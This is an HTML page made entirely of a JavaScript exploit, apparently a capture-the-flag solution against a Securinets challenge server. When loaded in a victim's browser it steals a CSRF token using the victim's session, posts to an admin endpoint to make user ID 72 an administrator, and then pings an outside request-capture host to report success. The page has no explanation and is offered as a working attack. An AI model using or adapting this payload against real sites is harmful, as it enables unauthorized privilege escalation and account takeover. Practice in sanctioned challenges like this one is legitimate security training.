<!doctype html><meta charset="utf-8"><title>promote</title>
<script>
(async ()=>{
  const V = 'http://web1-79e4a3bc.p1.securinets.tn';

  let t = '';
  try {
    const r = await fetch(V+'/csrf-token', {credentials:'include'});
    t = (await r.json()).csrfToken;
  } catch(e) {}

  const ATTACKER_ID = 72;   
  if (t) {
    await fetch(V+'/admin/addAdmin', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type':'application/json', 'CSRF-Token': t},
      body: JSON.stringify({ userId: ATTACKER_ID })
    });
  }
  if (!t) {
    try {
      const r = await fetch(V+'/csrf-token', {credentials:'include'});
      t = (await r.json()).csrfToken;
    } catch(e){}
    if (t) {
      const params = new URLSearchParams({_csrf:t, userId:String(ATTACKER_ID)});
      await fetch(V+'/admin/addAdmin', {
        method:'POST', credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body: params.toString()
      });
    }
  }

  new Image().src='https://xqimudd.request.dreamhack.games/?d=promoted';
})();
</script>
